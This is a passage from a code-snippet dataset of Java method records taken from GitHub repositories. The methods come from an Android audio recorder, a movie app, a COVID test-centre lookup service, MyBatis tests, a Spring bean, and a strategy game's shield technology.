Runnable() {\n            @Override\n            public void run() {\n                if (PcmToWav.mergePCMFilesToWAVFile(filePaths, FileUtil.getWavFileAbsolutePath(fileName))) {\n                    //\u64cd\u4f5c\u6210\u529f\n                } else {\n                    //\u64cd\u4f5c\u5931\u8d25\n                    Log.e(\"AudioRecorder\", \"mergePCMFilesToWAVFile fail\");\n                    throw new IllegalStateException(\"mergePCMFilesToWAVFile fail\");\n                }\n                fileName = null;\n            }\n        }).start();\n    }", "url": "https://raw.githubusercontent.com/dreamfish797/AudioRecorder/master/record/src/main/java/com/dreamfish/record/AudioRecorder.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56358, "method_name": "makePCMFileToWAVFile", "class_name": "AudioRecorder", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void makePCMFileToWAVFile() {\n        new Thread(new Runnable() {\n            @Override\n            public void run() {\n                if (PcmToWav.makePCMFileToWAVFile(FileUtil.getPcmFileAbsolutePath(fileName), FileUtil.getWavFileAbsolutePath(fileName), true)) {\n                    //\u64cd\u4f5c\u6210\u529f\n                } else {\n                    //\u64cd\u4f5c\u5931\u8d25\n                    Log.e(\"AudioRecorder\", \"makePCMFileToWAVFile fail\");\n                    throw new IllegalStateException(\"makePCMFileToWAVFile fail\");\n                }\n                fileName = null;\n            }\n        }).start();\n    }", "url": "https://raw.githubusercontent.com/dreamfish797/AudioRecorder/master/record/src/main/java/com/dreamfish/record/AudioRecorder.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56359, "method_name": "getStatus", "class_name": "AudioRecorder", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Status", "snippet": "    public Status getStatus() {\n        return status;\n    }", "url": "https://raw.githubusercontent.com/dreamfish797/AudioRecorder/master/record/src/main/java/com/dreamfish/record/AudioRecorder.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56360, "method_name": "getPcmFilesCount", "class_name": "AudioRecorder", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getPcmFilesCount() {\n        return filesName.size();\n    }", "url": "https://raw.githubusercontent.com/dreamfish797/AudioRecorder/master/record/src/main/java/com/dreamfish/record/AudioRecorder.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56361, "method_name": "startActivity", "class_name": "MediaDetailActivity", "params": ["Context", "Media"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void startActivity(Context context, Media media) {\n        Intent intent = new Intent(context, MediaDetailActivity.class);\n        if (media != null)\n            sMedia = media;\n        context.startActivity(intent);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/activities/MediaDetailActivity.java", "stars": "4", "class_props": {"extends": "ButterBaseActivity", "implements": ["BaseDetailFragment"], "modifiers": ["public"]}}, {"id": 56362, "method_name": "onCreate", "class_name": "MediaDetailActivity", "params": ["Bundle"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onCreate(Bundle savedInstanceState) {\n        getWindow().getDecorView().setSystemUiVisibility(View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN);\n        MobileButterApplication.getAppContext()\n                .getComponent()\n                .inject(this);\n        super.onCreate(savedInstanceState, R.layout.activity_mediadetail);\n        setSupportActionBar(mToolbar);\n        setShowCasting(true);\n\n        // Set transparent toolbar\n        // Hacky empty string to make sure title textview is added to the toolbar\n        if(getSupportActionBar() != null) {\n            getSupportActionBar().setTitle(\"   \");\n            getSupportActionBar().setDisplayHomeAsUpEnabled(true);\n        }\n        ActionBarBackground.fadeOut(this);\n\n        // Get Title TextView from the Toolbar\n        if (mToolbar.getChildAt(0) instanceof TextView) {\n            mToolbarTitle = (TextView) mToolbar.getChildAt(0);\n        } else {\n            mToolbarTitle = (TextView) mToolbar.getChildAt(1);\n        }\n        mToolbarTitle.setVisibility(View.INVISIBLE);\n\n        // mParallaxLayout doesn't exist? Then this is a tablet or big screen device\n        mIsTablet = mParallaxLayout == null;\n\n        if(sMedia == null) {\n            finish();\n            return;\n        }\n\n        getSupportActionBar().setTitle(sMedia.title);\n\n        mScrollView.setListener(mOnScrollListener);\n        mScrollView.setOverScrollEnabled(false);\n        // Calculate toolbar scrolling variables\n        if (!mIsTablet) {\n            int parallaxHeight = mParallaxLayout.getLayoutParams().height = PixelUtils.getScreenHeight(this);\n            mTopHeight = (parallaxHeight / 3) * 2;\n            ((LinearLayout.LayoutParams) mContent.getLayoutParams()).topMargin = -(parallaxHeight / 3);\n            mContent.setMinimumHeight(mTopHeight / 3);\n\n            mParallaxColor.setBackgroundColor(sMedia.color);\n            mParallaxColor.getBackground().setAlpha(0);\n            mToolbar.setBackgroundColor(sMedia.color);\n            mToolbar.getBackground().setAlpha(0);\n        } else {\n            mTopHeight = (PixelUtils.getScreenHeight(this) / 2);\n            ((LinearLayout.LayoutParams) mContent.getLayoutParams()).topMargin = mTopHeight;\n            mContent.setMinimumHeight(mTopHeight);\n        }\n\n        Fragment fragment = null;\n        if (sMedia.isMovie) {\n            fragment = MovieDetailFragment.newInstance((Movie) sMedia);\n        } else if (sMedia instanceof Show) {\n            fragment = ShowDetailFragment.newInstance((Show) sMedia);\n        }\n\n        if (fragment != null) {\n            FragmentManager fragmentManager = getSupportFragmentManager();\n            fragmentManager.beginTransaction().replace(R.id.content, fragment).commit();\n        }\n\n        String imageUrl = sMedia.image;\n        if (mIsTablet || !PixelUtils.screenIsPortrait(this)) {\n            imageUrl = sMedia.headerImage;\n        }\n        Picasso.get().load(imageUrl).into(mBgImage, new Callback() {\n            @Override\n            public void onSuccess() {\n                mHandler.post(new Runnable() {\n                    @Override\n                    public void run() {\n                        AnimUtils.fadeIn(mBgImage);\n                        mLogo.setVisibility(View.GONE);\n                    }\n                });\n            }\n\n            @Override\n            public void onError(Exception exc) {\n            }\n        });\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/activities/MediaDetailActivity.java", "stars": "4", "class_props": {"extends": "ButterBaseActivity", "implements": ["BaseDetailFragment"], "modifiers": ["public"]}}, {"id": 56363, "method_name": "onResume", "class_name": "MediaDetailActivity", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onResume() {\n        super.onResume();\n        supportInvalidateOptionsMenu();\n\n        if (null != mService) {\n            mService.stopStreaming();\n        }\n        BeamPlayerNotificationService.cancelNotification();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/activities/MediaDetailActivity.java", "stars": "4", "class_props": {"extends": "ButterBaseActivity", "implements": ["BaseDetailFragment"], "modifiers": ["public"]}}, {"id": 56364, "method_name": "playStream", "class_name": "MediaDetailActivity", "params": ["StreamInfo"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void playStream(StreamInfo streamInfo) {\n        if (PrefUtils.get(this, Prefs.WIFI_ONLY, true) &&\n                !NetworkUtils.isWifiConnected(this) &&\n                !NetworkUtils.isEthernetConnected(this) &&\n                NetworkUtils.isNetworkConnected(this)) {\n            MessageDialogFragment.show(getFragmentManager(), R.string.wifi_only, R.string.wifi_only_message);\n        } else {\n            if(mService != null) {\n                mService.startForeground();\n            }\n\n            if (VersionUtils.isLollipop()) {\n                mScrollView.smoothScrollTo(0, 0);\n                StreamLoadingActivity.startActivity(this, streamInfo, Pair.create((View) mBgImage, ViewCompat.getTransitionName(mBgImage)));\n            } else {\n                StreamLoadingActivity.startActivity(this, streamInfo);\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/activities/MediaDetailActivity.java", "stars": "4", "class_props": {"extends": "ButterBaseActivity", "implements": ["BaseDetailFragment"], "modifiers": ["public"]}}, {"id": 56365, "method_name": "setSubScrollListener", "class_name": "MediaDetailActivity", "params": ["ObservableParallaxScrollView"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setSubScrollListener(ObservableParallaxScrollView.Listener subScrollListener) {\n        mSubOnScrollListener = subScrollListener;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/activities/MediaDetailActivity.java", "stars": "4", "class_props": {"extends": "ButterBaseActivity", "implements": ["BaseDetailFragment"], "modifiers": ["public"]}}, {"id": 56366, "method_name": "getHeaderHeight", "class_name": "MediaDetailActivity", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getHeaderHeight() {\n        return mHeaderHeight;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/activities/MediaDetailActivity.java", "stars": "4", "class_props": {"extends": "ButterBaseActivity", "implements": ["BaseDetailFragment"], "modifiers": ["public"]}}, {"id": 56367, "method_name": "getAllCenters", "class_name": "TestCenterService", "params": ["ServiceCallback"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void getAllCenters(ServiceCallback callback){\n        CollectionReference collectionReference = firestore.collection(collectionName);\n        collectionReference.get().addOnSuccessListener(new OnSuccessListener<QuerySnapshot>() {\n            @Override\n            public void onSuccess(QuerySnapshot documentSnapshots) {\n                mapResultAndCallback(documentSnapshots, callback, -1);\n            }\n        }).addOnFailureListener(new OnFailureListener() {\n            @Override\n            public void onFailure(@NonNull Exception e) {\n                callback.onFailed(e);\n            }\n        });\n    }", "url": "https://raw.githubusercontent.com/swesust/covid-19-help-support-bd/master/Covid19Shahajjo/app/src/main/java/com/example/covid19shahajjo/services/TestCenterService.java", "stars": "9", "class_props": {"extends": null, "implements": ["FireStoreService"], "modifiers": ["public"]}}, {"id": 56368, "method_name": "getCenters", "class_name": "TestCenterService", "params": ["String", "ServiceCallback"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void getCenters(String districtName, ServiceCallback callback){\n        CollectionReference collectionReference = firestore.collection(collectionName);\n        collectionReference.whereEqualTo(\"District\", districtName).get()\n            .addOnSuccessListener(new OnSuccessListener<QuerySnapshot>() {\n                @Override\n                public void onSuccess(QuerySnapshot documentSnapshots) {\n                    mapResultAndCallback(documentSnapshots, callback, -1);\n                }\n            }).addOnFailureListener(new OnFailureListener() {\n                @Override\n                public void onFailure(@NonNull Exception e) {\n                    callback.onFailed(e);\n                }\n            });\n    }", "url": "https://raw.githubusercontent.com/swesust/covid-19-help-support-bd/master/Covid19Shahajjo/app/src/main/java/com/example/covid19shahajjo/services/TestCenterService.java", "stars": "9", "class_props": {"extends": null, "implements": ["FireStoreService"], "modifiers": ["public"]}}, {"id": 56369, "method_name": "mapResultAndCallback", "class_name": "TestCenterService", "params": ["QuerySnapshot", "ServiceCallback", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void mapResultAndCallback(QuerySnapshot querySnapshot, ServiceCallback callback, int token) {\n        Logger.getLogger(LOGGER).log(Level.INFO, \"result mapper called\");\n\n        List<TestCenter> data = new ArrayList<>();\n        if(querySnapshot.isEmpty()){\n            callback.onResult(data);\n            return;\n        }\n        for(DocumentSnapshot doc : querySnapshot.getDocuments()){\n            TestCenter testCenter = doc.toObject(TestCenter.class);\n            testCenter.Id = doc.getId();\n            data.add(testCenter);\n        }\n        callback.onResult(data);\n    }", "url": "https://raw.githubusercontent.com/swesust/covid-19-help-support-bd/master/Covid19Shahajjo/app/src/main/java/com/example/covid19shahajjo/services/TestCenterService.java", "stars": "9", "class_props": {"extends": null, "implements": ["FireStoreService"], "modifiers": ["public"]}}, {"id": 56370, "method_name": "mapResultAndCallback", "class_name": "TestCenterService", "params": ["DocumentSnapshot", "ServiceCallback", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void mapResultAndCallback(DocumentSnapshot documentSnapshot, ServiceCallback callback, int token) {\n\n    }", "url": "https://raw.githubusercontent.com/swesust/covid-19-help-support-bd/master/Covid19Shahajjo/app/src/main/java/com/example/covid19shahajjo/services/TestCenterService.java", "stars": "9", "class_props": {"extends": null, "implements": ["FireStoreService"], "modifiers": ["public"]}}, {"id": 56371, "method_name": "getCollectionReference", "class_name": "TestCenterService", "params": ["CollectionReference", "ServiceCallback", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void getCollectionReference(CollectionReference collectionReference, ServiceCallback callback, int token) {\n\n    }", "url": "https://raw.githubusercontent.com/swesust/covid-19-help-support-bd/master/Covid19Shahajjo/app/src/main/java/com/example/covid19shahajjo/services/TestCenterService.java", "stars": "9", "class_props": {"extends": null, "implements": ["FireStoreService"], "modifiers": ["public"]}}, {"id": 56372, "method_name": "getDocumentReference", "class_name": "TestCenterService", "params": ["DocumentReference", "ServiceCallback", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void getDocumentReference(DocumentReference documentReference, ServiceCallback callback, int token) {\n\n    }", "url": "https://raw.githubusercontent.com/swesust/covid-19-help-support-bd/master/Covid19Shahajjo/app/src/main/java/com/example/covid19shahajjo/services/TestCenterService.java", "stars": "9", "class_props": {"extends": null, "implements": ["FireStoreService"], "modifiers": ["public"]}}, {"id": 56373, "method_name": "testReverseIncludeXmlConfig", "class_name": "ReverseIncludeTest", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void testReverseIncludeXmlConfig() throws Exception {\n    testReverseIncludes(getSqlSessionFactoryXmlConfig());\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/xml_external_ref/ReverseIncludeTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 56374, "method_name": "testReverseIncludeJavaConfig", "class_name": "ReverseIncludeTest", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void testReverseIncludeJavaConfig() throws Exception {\n    testReverseIncludes(getSqlSessionFactoryJavaConfig());\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/xml_external_ref/ReverseIncludeTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 56375, "method_name": "testReverseIncludes", "class_name": "ReverseIncludeTest", "params": ["SqlSessionFactory"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void testReverseIncludes(SqlSessionFactory sqlSessionFactory) {\n    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n      ReverseIncludePersonMapper personMapper = sqlSession.getMapper(ReverseIncludePersonMapper.class);\n      Person person = personMapper.select(1);\n      assertEquals((Integer) 1, person.getId());\n      assertEquals(\"John\", person.getName());\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/xml_external_ref/ReverseIncludeTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 56376, "method_name": "getSqlSessionFactoryXmlConfig", "class_name": "ReverseIncludeTest", "params": [], "throws": ["Exception"], "modifiers": ["private"], "return_type": "SqlSessionFactory", "snippet": "  private SqlSessionFactory getSqlSessionFactoryXmlConfig() throws Exception {\n    try (Reader configReader = Resources\n        .getResourceAsReader(\"org/apache/ibatis/submitted/xml_external_ref/ReverseIncludeMapperConfig.xml\")) {\n      SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(configReader);\n\n      initDb(sqlSessionFactory);\n\n      return sqlSessionFactory;\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/xml_external_ref/ReverseIncludeTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 56377, "method_name": "getSqlSessionFactoryJavaConfig", "class_name": "ReverseIncludeTest", "params": [], "throws": ["Exception"], "modifiers": ["private"], "return_type": "SqlSessionFactory", "snippet": "  private SqlSessionFactory getSqlSessionFactoryJavaConfig() throws Exception {\n    Configuration configuration = new Configuration();\n    Environment environment = new Environment(\"development\", new JdbcTransactionFactory(), new UnpooledDataSource(\n        \"org.hsqldb.jdbcDriver\", \"jdbc:hsqldb:mem:xmlextref\", null));\n    configuration.setEnvironment(environment);\n    configuration.addMapper(ReverseIncludePersonMapper.class);\n\n    SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(configuration);\n\n    initDb(sqlSessionFactory);\n\n    return sqlSessionFactory;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/xml_external_ref/ReverseIncludeTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 56378, "method_name": "initDb", "class_name": "ReverseIncludeTest", "params": ["SqlSessionFactory"], "throws": ["IOException", "SQLException"], "modifiers": ["static", "private"], "return_type": "void", "snippet": "  private static void initDb(SqlSessionFactory sqlSessionFactory) throws IOException, SQLException {\n    BaseDataTest.runScript(sqlSessionFactory.getConfiguration().getEnvironment().getDataSource(),\n            \"org/apache/ibatis/submitted/xml_external_ref/CreateDB.sql\");\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/xml_external_ref/ReverseIncludeTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 56379, "method_name": "container", "class_name": "RedisListenerConfig", "params": ["RedisConnectionFactory"], "throws": null, "modifiers": [], "return_type": "RedisMessageListenerContainer", "snippet": "    RedisMessageListenerContainer container(RedisConnectionFactory connectionFactory) {\n\n        RedisMessageListenerContainer container = new RedisMessageListenerContainer();\n        container.setConnectionFactory(connectionFactory);\n        return container;\n    }", "url": "https://raw.githubusercontent.com/chengxy-nds/delayqueue/master/src/main/java/com/chengxy/delayqueue/redis/rediscallback/RedisListenerConfig.java", "stars": "7", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56380, "method_name": "getEmpNo", "class_name": "EmployeeBO", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int getEmpNo() {\n\t\treturn empNo;\n\t}", "url": "https://raw.githubusercontent.com/nataraz123/Spring/master/IOCProj39-LayeredApp-NestedBeanFactory/src/main/java/com/nt/bo/EmployeeBO.java", "stars": "8", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56381, "method_name": "setEmpNo", "class_name": "EmployeeBO", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setEmpNo(int empNo) {\n\t\tthis.empNo = empNo;\n\t}", "url": "https://raw.githubusercontent.com/nataraz123/Spring/master/IOCProj39-LayeredApp-NestedBeanFactory/src/main/java/com/nt/bo/EmployeeBO.java", "stars": "8", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56382, "method_name": "getEname", "class_name": "EmployeeBO", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getEname() {\n\t\treturn ename;\n\t}", "url": "https://raw.githubusercontent.com/nataraz123/Spring/master/IOCProj39-LayeredApp-NestedBeanFactory/src/main/java/com/nt/bo/EmployeeBO.java", "stars": "8", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56383, "method_name": "setEname", "class_name": "EmployeeBO", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setEname(String ename) {\n\t\tthis.ename = ename;\n\t}", "url": "https://raw.githubusercontent.com/nataraz123/Spring/master/IOCProj39-LayeredApp-NestedBeanFactory/src/main/java/com/nt/bo/EmployeeBO.java", "stars": "8", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56384, "method_name": "getJob", "class_name": "EmployeeBO", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getJob() {\n\t\treturn job;\n\t}", "url": "https://raw.githubusercontent.com/nataraz123/Spring/master/IOCProj39-LayeredApp-NestedBeanFactory/src/main/java/com/nt/bo/EmployeeBO.java", "stars": "8", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56385, "method_name": "setJob", "class_name": "EmployeeBO", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setJob(String job) {\n\t\tthis.job = job;\n\t}", "url": "https://raw.githubusercontent.com/nataraz123/Spring/master/IOCProj39-LayeredApp-NestedBeanFactory/src/main/java/com/nt/bo/EmployeeBO.java", "stars": "8", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56386, "method_name": "getSal", "class_name": "EmployeeBO", "params": [], "throws": null, "modifiers": ["public"], "return_type": "float", "snippet": "\tpublic float getSal() {\n\t\treturn sal;\n\t}", "url": "https://raw.githubusercontent.com/nataraz123/Spring/master/IOCProj39-LayeredApp-NestedBeanFactory/src/main/java/com/nt/bo/EmployeeBO.java", "stars": "8", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56387, "method_name": "setSal", "class_name": "EmployeeBO", "params": ["float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setSal(float sal) {\n\t\tthis.sal = sal;\n\t}", "url": "https://raw.githubusercontent.com/nataraz123/Spring/master/IOCProj39-LayeredApp-NestedBeanFactory/src/main/java/com/nt/bo/EmployeeBO.java", "stars": "8", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56388, "method_name": "getDeptNo", "class_name": "EmployeeBO", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int getDeptNo() {\n\t\treturn deptNo;\n\t}", "url": "https://raw.githubusercontent.com/nataraz123/Spring/master/IOCProj39-LayeredApp-NestedBeanFactory/src/main/java/com/nt/bo/EmployeeBO.java", "stars": "8", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56389, "method_name": "setDeptNo", "class_name": "EmployeeBO", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setDeptNo(int deptNo) {\n\t\tthis.deptNo = deptNo;\n\t}", "url": "https://raw.githubusercontent.com/nataraz123/Spring/master/IOCProj39-LayeredApp-NestedBeanFactory/src/main/java/com/nt/bo/EmployeeBO.java", "stars": "8", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56390, "method_name": "getMgr", "class_name": "EmployeeBO", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int getMgr() {\n\t\treturn mgr;\n\t}", "url": "https://raw.githubusercontent.com/nataraz123/Spring/master/IOCProj39-LayeredApp-NestedBeanFactory/src/main/java/com/nt/bo/EmployeeBO.java", "stars": "8", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56391, "method_name": "setMgr", "class_name": "EmployeeBO", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setMgr(int mgr) {\n\t\tthis.mgr = mgr;\n\t}", "url": "https://raw.githubusercontent.com/nataraz123/Spring/master/IOCProj39-LayeredApp-NestedBeanFactory/src/main/java/com/nt/bo/EmployeeBO.java", "stars": "8", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56392, "method_name": "toString", "class_name": "EmployeeBO", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String toString() {\n\t\treturn \"EmployeeBO [empNo=\" + empNo + \", ename=\" + ename + \", job=\" + job + \", sal=\" + sal + \", deptNo=\"\n\t\t\t\t+ deptNo + \", mgr=\" + mgr + \"]\";\n\t}", "url": "https://raw.githubusercontent.com/nataraz123/Spring/master/IOCProj39-LayeredApp-NestedBeanFactory/src/main/java/com/nt/bo/EmployeeBO.java", "stars": "8", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56393, "method_name": "canBeMiniaturized", "class_name": "TechDeflectorShield", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean canBeMiniaturized()      { return true; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/tech/TechDeflectorShield.java", "stars": "74", "class_props": {"extends": "Tech", "implements": null, "modifiers": ["final", "public"]}}, {"id": 56394, "method_name": "init", "class_name": "TechDeflectorShield", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void init() {\n        super.init();\n        techType = Tech.DEFLECTOR_SHIELD;\n        baseShield = new MissileBaseShield(this);\n\n        switch(typeSeq) {\n            case 0:\n                damage = 0;\n                baseShield.baseCost(0);\n                free = true;\n                break;\n            case 1:\n                damage = 1;\n                baseShield.baseCost(75);\n                free = true;\n                break;\n            case 2:\n                damage = 2;\n                baseShield.baseCost(89);\n                break;\n            case 3:\n                damage = 3;\n                baseShield.baseCost(103);\n                break;\n            case 4:\n                damage = 4;\n                baseShield.baseCost(117);\n                break;\n            case 5:\n                damage = 5;\n                baseShield.baseCost(130);\n                break;\n            case 6:\n                damage = 6;\n                baseShield.baseCost(144);\n                break;\n            case 7:\n                damage = 7;\n                baseShield.baseCost(158);\n                break;\n            case 8:\n                damage = 9;\n                baseShield.baseCost(172);\n                break;\n            case 9:\n                damage = 11;\n                baseShield.baseCost(186);\n                break;\n            case 10:\n                damage = 13;\n                baseShield.baseCost(199);\n                break;\n            case 11:\n                damage = 15;\n                baseShield.baseCost(213);\n                break;\n        }\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/tech/TechDeflectorShield.java", "stars": "74", "class_props": {"extends": "Tech", "implements": null, "modifiers": ["final", "public"]}}, {"id": 56395, "method_name": "warModeFactor", "class_name": "TechDeflectorShield", "params": [], "throws": null, "modifiers": ["public"], "return_type": "float", "snippet": "    public float warModeFactor()        { return 2; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/tech/TechDeflectorShield.java", "stars": "74", "class_props": {"extends": "Tech", "implements": null, "modifiers": ["final", "public"]}}, {"id": 56396, "method_name": "providesShipComponent", "class_name": "TechDeflectorShield", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean providesShipComponent()  { return true; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/tech/TechDeflectorShield.java", "stars": "74", "class_props": {"extends": "Tech", "implements": null, "modifiers": ["final", "public"]}}, {"id": 56397, "method_name": "isObsolete", "class_name": "TechDeflectorShield", "params": ["Empire"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isObsolete(Empire c) {\n        return damage < c.tech().maxDeflectorShieldLevel();\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/tech/TechDeflectorShield.java", "stars": "74", "class_props": {"extends": "Tech", "implements": null, "modifiers": ["final", "public"]}}, {"id": 56398, "method_name": "baseValue", "class_name": "TechDeflectorShield", "params": ["Empire"], "throws": null, "modifiers": ["public"], "return_type": "float", "snippet": "    public float baseValue(Empire c) { return c.ai().scientist().baseValue(this); }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/tech/TechDeflectorShield.java", "stars": "74", "class_props": {"extends": "Tech", "implements": null, "modifiers": ["final", "public"]}}, {"id": 56399, "method_name": "provideBenefits", "class_name": "TechDeflectorShield", "params": ["Empire"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void provideBenefits(Empire c) {\n        super.provideBenefits(c);\n        if (!isObsolete(c)) {\n            c.tech().topDeflectorShieldTech(this);\n            c.tech().updateMissileBase();\n        }\n        ShipShield sh = new ShipShield(this);\n        c.shipLab().addShield(sh);\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/tech/TechDeflectorShield.java", "stars": "74", "class_props": {"extends": "Tech", "implements": null, "modifiers": ["final", "public"]}}, {"id": 56400, "method_name": "ranking", "class_name": "TechDeflectorShield", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int ranking() {\n        return damage <= 7 ? damage : (int) (7 + ((damage-7) /2));\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/tech/TechDeflectorShield.java", "stars": "74", "class_props": {"extends": "Tech", "implements": null, "modifiers": ["final", "public"]}}, {"id": 56401, "method_name": "baseCost", "class_name": "TechDeflectorShield", "params": ["ShipDesign"], "throws": null, "modifiers": ["public"], "return_type": "float", "snippet": "    public float baseCost(ShipDesign d) {\n        switch(d.size()) {\n            case ShipDesign.SMALL  : return 2.5f + (.5f*ranking());\n            case ShipDesign.MEDIUM : return 16  + (3*ranking());\n            case ShipDesign.LARGE  : return 100 + (20*ranking());\n            case ShipDesign.HUGE   : return 625 + (125*ranking());\n        }\n        return 0;\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/tech/TechDeflectorShield.java", "stars": "74", "class_props": {"extends": "Tech", "implements": null, "modifiers": ["final", "public"]}}, {"id": 56402, "method_name": "baseSize", "class_name": "TechDeflectorShield", "params": ["ShipDesign"], "throws": null, "modifiers": ["public"], "return_type": "float", "snippet": "    public float baseSize(ShipDesign d) {\n        switch(d.size()) {\n            case ShipDesign.SMALL  : return 5*ranking();\n            case ShipDesign.MEDIUM : return 5  + (15*ranking());\n            case ShipDesign.LARGE  : return 30 + (30*ranking());\n            case ShipDesign.HUGE   : return 125 + (125*ranking());\n        }\n        return 0;\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/tech/TechDeflectorShield.java", "stars": "74", "class_props": {"extends": "Tech", "implements": null, "modifiers": ["final", "public"]}}, {"id": 56403, "method_name": "basePower", "class_name": "TechDeflectorShield", "params": 